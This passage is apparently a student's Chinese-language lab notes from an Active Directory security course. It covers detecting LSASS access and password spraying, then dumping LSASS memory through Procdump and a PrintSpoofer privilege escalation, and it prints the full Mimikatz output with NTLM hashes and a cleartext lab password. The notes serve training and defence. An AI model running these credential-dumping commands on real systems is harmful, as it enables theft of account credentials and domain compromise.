+ &lt;a class="anchor" href="#lab">#&lt;/a>
+&lt;/h2>
+&lt;h3 id="偵測lsass">
+ ==偵測LSASS==
+ &lt;a class="anchor" href="#%e5%81%b5%e6%b8%aclsass">#&lt;/a>
+&lt;/h3>
+&lt;p>利用Sysmon Event ID: 10&lt;/p>
+&lt;ol>
+&lt;li>準備sysmonconfig
+就像前面說的，每一間公司的sysmonconfig都是機密，所以我們這次的lab，講師也有準備簡易的sysmonconfig
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;Sysmon&lt;/span> &lt;span style="color:#a6e22e">schemaversion=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;4.1&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;HashAlgorithm&amp;gt;&lt;/span>SHA256&lt;span style="color:#f92672">&amp;lt;/HashAlgorithm&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;EventFiltering&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;ProcessAccess&lt;/span> &lt;span style="color:#a6e22e">default=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;include&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/ProcessAccess&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/EventFiltering&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/Sysmon&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>安裝Sysmon
+按照前面提到的指令，並把sysconfig準備好
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ Sysmon64.exe -i sysmonconfig-export.xml
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>System Monitor v15.0 - System activity monitor
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>By Mark Russinovich and Thomas Garnier
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Copyright &lt;span style="color:#f92672">(&lt;/span>C&lt;span style="color:#f92672">)&lt;/span> 2014-2023 Microsoft Corporation
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Using libxml2. libxml2 is Copyright &lt;span style="color:#f92672">(&lt;/span>C&lt;span style="color:#f92672">)&lt;/span> 1998-2012 Daniel Veillard. All Rights Reserved.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sysinternals - www.sysinternals.com
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Loading configuration file with schema version 4.10
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sysmon schema version: 4.90
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::warning
+實作中這邊遇到問題，理論上準備好sysmonconfig之後下command應該會安裝，但他只跑到一半就結束了，不確定是不是因為沒有連網還是其他設定沒有做好，總之，sysmon算是不能用了，所以之後還有其他的lab會用到就只能跳過
+:::&lt;/li>
+&lt;li>Skip&lt;/li>
+&lt;/ol></description></item><item><title>NTUSTISC - AD Note - Lab(偵測密碼揮灑)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x15%E5%81%B5%E6%B8%AC%E5%AF%86%E7%A2%BC%E6%8F%AE%E7%81%91/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x15%E5%81%B5%E6%B8%AC%E5%AF%86%E7%A2%BC%E6%8F%AE%E7%81%91/</guid><description>&lt;h1 id="ntustisc---ad-note---lab偵測密碼揮灑">
+ NTUSTISC - AD Note - Lab(偵測密碼揮灑)
+ &lt;a class="anchor" href="#ntustisc---ad-note---lab%e5%81%b5%e6%b8%ac%e5%af%86%e7%a2%bc%e6%8f%ae%e7%81%91">#&lt;/a>
+&lt;/h1>
+&lt;p>[TOC]&lt;/p>
+&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;amp;t=4257">2022/05/04 AD 安全1&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>得到更高權限之後，會想要更多的密碼&lt;/p>
+&lt;ul>
+&lt;li>密碼收集
+&lt;ul>
+&lt;li>SAM.hive(Security Account Manager)&lt;/li>
+&lt;li>Password Spraying(用猜的)
+&lt;ul>
+&lt;li>和brute force差在哪裡呢?其實概念一樣，只是角度不一樣，brute force是針對一隻帳號，用很多的密碼去猜；而password spraying則是用一組密碼去爆所有的帳號，其實就是反過來&lt;/li>
+&lt;li>Tool: &lt;a href="https://github.com/Porchetta-Industries/CrackMapExec">CrackMapExec&lt;/a> - 結合各種功能的內網滲透神器&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>GPO&lt;/li>
+&lt;li>記憶體(lsass)&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="lab">
+ Lab
+ &lt;a class="anchor" href="#lab">#&lt;/a>
+&lt;/h2>
+&lt;h3 id="lab-how-to-detect-password-spraying">
+ ==Lab: How to detect Password Spraying==
+ &lt;a class="anchor" href="#lab-how-to-detect-password-spraying">#&lt;/a>
+&lt;/h3>
+&lt;p>利用Event ID: 4625, 4648, 4771的認證失敗紀錄
+&lt;img src="https://hackmd.io/_uploads/ryxGszmR2.png" alt="" />
+可以看到我是大約在4:52:08左右執行的，有一大堆的4625紀錄，如果抓最後一筆的紀錄，會顯示Account Name就是我們在Kali看到的最後一個帳戶，而且Keyword顯示Audit Failure
+&lt;img src="https://hackmd.io/_uploads/SJ0wszXA2.png" alt="" />&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(其他方法得到lsass.dmp)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x18%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95%E5%BE%97%E5%88%B0lsass.dmp/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x18%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95%E5%BE%97%E5%88%B0lsass.dmp/</guid><description>&lt;h1 id="ntustisc---ad-note---lab其他方法得到lsassdmp">
+ NTUSTISC - AD Note - Lab(其他方法得到lsass.dmp)
+ &lt;a class="anchor" href="#ntustisc---ad-note---lab%e5%85%b6%e4%bb%96%e6%96%b9%e6%b3%95%e5%be%97%e5%88%b0lsassdmp">#&lt;/a>
+&lt;/h1>
+&lt;p>[TOC]&lt;/p>
+&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;amp;t=4257">2022/05/04 AD 安全1&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>有了Mimikatz也不一定能夠用，因為Windows的defender也知道這是個好用的東西，對於攻擊方而言，所以會盡可能的直接刪除，那要怎麼bypass或用其他方法把LSASS帶走?&lt;/p>
+&lt;h2 id="lab">
+ Lab
+ &lt;a class="anchor" href="#lab">#&lt;/a>
+&lt;/h2>
+&lt;h3 id="take-lsass-with-other-ways">
+ ==Take LSASS with other ways==
+ &lt;a class="anchor" href="#take-lsass-with-other-ways">#&lt;/a>
+&lt;/h3>
+&lt;h4 id="方法一">
+ 方法一
+ &lt;a class="anchor" href="#%e6%96%b9%e6%b3%95%e4%b8%80">#&lt;/a>
+&lt;/h4>
+&lt;p>在windows工作管理員中，找到Local Security Authority Process(LSASS)，右鍵選==建立傾印檔案==，就可以直接dump memory，然後再把這一份檔案丟到自己可以開mimikatz的電腦，就可以分析了，會有一樣的效果
+&lt;img src="https://hackmd.io/_uploads/ryINQ7NRh.png" alt="" />
+&lt;img src="https://hackmd.io/_uploads/ByvHX7NR2.png" alt="" />&lt;/p>
+&lt;h4 id="方法二">
+ 方法二
+ &lt;a class="anchor" href="#%e6%96%b9%e6%b3%95%e4%ba%8c">#&lt;/a>
+&lt;/h4>
+&lt;p>如果沒有GUI的話，也可以考慮直接使用&lt;a href="https://docs.microsoft.com/zh-tw/sysinternals/downloads/procdump">Procdump&lt;/a>，當然你必須要取得足夠的權限，要不就是用前面提到的IIS提權執行指令，不然就直接切換administrator帳戶，我是用前者
+Command: &lt;code>c:\tools\PrintSpoofer64.exe -c &amp;quot;c:\windows\system32\cmd.exe /c c:\tools\Procdump\procdump.exe -accepteula -ma lsass.exe lsass.dmp &amp;gt; c:\inetpub\wwwroot\tmp.txt&amp;quot;&lt;/code>
+&lt;img src="https://hackmd.io/_uploads/HJXt8mN0h.png" alt="" />
+可以看到它放在&lt;code>C:\Windows\system32\lsass.dmp&lt;/code>中&lt;/p>
+&lt;h4 id="透過minidump獲取資訊">
+ 透過Minidump獲取資訊
+ &lt;a class="anchor" href="#%e9%80%8f%e9%81%8eminidump%e7%8d%b2%e5%8f%96%e8%b3%87%e8%a8%8a">#&lt;/a>
+&lt;/h4>
+&lt;p>有了前面的lsass.dmp，就可以繼續使用mimikatz得到一些有用的資訊，只是，指令稍微有點不太一樣，因為我們不用對lsass進行debug&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ Sekurlsa::minidump &lt;span style="color:#e6db74">&amp;#34;&amp;lt;path to lsass.dmp&amp;gt;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ Sekurlsa::logonPasswords
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::spoiler Result&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>mimikatz &lt;span style="color:#75715e"># Sekurlsa::minidump &amp;#34;C:\Windows\system32\lsass.dmp&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Switch to MINIDUMP : &lt;span style="color:#e6db74">&amp;#39;C:\Windows\system32\lsass.dmp&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mimikatz &lt;span style="color:#75715e"># log&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Using &lt;span style="color:#e6db74">&amp;#39;mimikatz.log&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> logfile : OK
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mimikatz &lt;span style="color:#75715e"># Sekurlsa::logonPasswords&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Opening : &lt;span style="color:#e6db74">&amp;#39;C:\Windows\system32\lsass.dmp&amp;#39;&lt;/span> file &lt;span style="color:#66d9ef">for&lt;/span> minidump...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">2913881&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:002c7659&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Service from &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : DefaultAppPool
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : IIS APPPOOL
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 11:49:20
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma.org
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">2569783&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:00273637&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : CachedInteractive from &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : Administrator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : WIN-818G5VCOLJO
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 11:39:37
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-21-306106713-2531972042-334329499-500
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 7ecffff0c3548187607a14bad0f88bb1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * DPAPI : cf967ea9c9c0f9d58b79fdd040270648
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : 1qaz@WSX3edc
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">1145006&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:001178ae&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : CachedInteractive from &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : Administrator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : WIN-818G5VCOLJO
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:43:30
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-21-306106713-2531972042-334329499-500
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 7ecffff0c3548187607a14bad0f88bb1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * DPAPI : cf967ea9c9c0f9d58b79fdd040270648
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : 1qaz@WSX3edc
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">419256&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000665b8&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : bear
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : WIN-818G5VCOLJO
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:29:31
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-21-306106713-2531972042-334329499-2101
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : bear
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 7ecffff0c3548187607a14bad0f88bb1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * DPAPI : 4057a0d0b94378dd03224e8b3d28a006
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : bear
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : bear
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">995&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000003e3&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Service from &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : IUSR
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : NT AUTHORITY
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:22:35
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-17
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">997&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000003e5&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Service from &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : LOCAL SERVICE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : NT AUTHORITY
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:22:24
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-19
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
